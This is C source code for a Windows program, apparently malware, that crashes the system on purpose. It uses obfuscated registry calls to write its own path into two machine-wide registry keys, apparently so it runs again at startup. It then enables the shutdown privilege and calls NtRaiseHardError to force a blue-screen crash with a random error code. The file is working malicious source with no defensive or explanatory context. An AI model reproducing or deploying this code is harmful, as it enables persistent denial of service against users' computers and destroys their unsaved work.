#include "bsod.h"

int main(int argc, char *argv[])
{
	TCHAR pth[MAX_PATH];
	unsigned int len;
	len = GetModuleFileName(NULL, pth, MAX_PATH);
	HMODULE advapi = LoadLibrary(ADVAPI32PTH);
	ROKEF = ROKEF2 GetProcAddress(advapi, ROKE);
	RSVEF = RSVEF2 GetProcAddress(advapi, RSVE);
	LSTATUS (*RegCloseKe)(HKEY) = (LSTATUS (*)(HKEY))GetProcAddress(advapi, "RegCloseKey");
	HKEY reg;
	RegOpenKeyE(HKEY_LOCAL_MACHINE, REGPTH1, 0, KEY_WRITE, &reg);
	RegSetValueE(reg, REGKEY1, 0, REG_SZ, (const BYTE *)pth, (len + 1) * sizeof(TCHAR));
	RegCloseKe(reg);
	RegOpenKeyE(HKEY_LOCAL_MACHINE, REGPTH2, 0, KEY_WRITE, &reg);
	RegSetValueE(reg, REGKEY2, 0, REG_SZ, (const BYTE *)pth, (len + 1) * sizeof(TCHAR));
	RegCloseKe(reg);
	FreeLibrary(advapi);
	srand((unsigned int)time(NULL));
	HMODULE ntdll = LoadLibrary(NTDLLPTH);
	NTSTATUS (*RtlAdjustPrivilege)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN) = (NTSTATUS (*)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN))GetProcAddress(ntdll, "RtlAdjustPrivilege");
	BOOLEAN tmp1;
	RtlAdjustPrivilege(SeShutdownPrivilege, TRUE, FALSE, &tmp1);
	NTSTATUS (*NtRaiseHardError)(NTSTATUS, ULONG, PUNICODE_STRING, PVOID, HARDERROR_RESPONSE_OPTION, PHARDERROR_RESPONSE) = (NTSTATUS (*)(NTSTATUS, ULONG, PUNICODE_STRING, PVOID, HARDERROR_RESPONSE_OPTION, PHARDERROR_RESPONSE))GetProcAddress(ntdll, "NtRaiseHardError");
	HARDERROR_RESPONSE tmp2;
	NtRaiseHardError(0xc0000000 | (rand() << 13) | (rand() >> 2), 0, NULL, NULL, OptionShutdownSystem, &tmp2);
	FreeLibrary(ntdll);
	return 0;
}
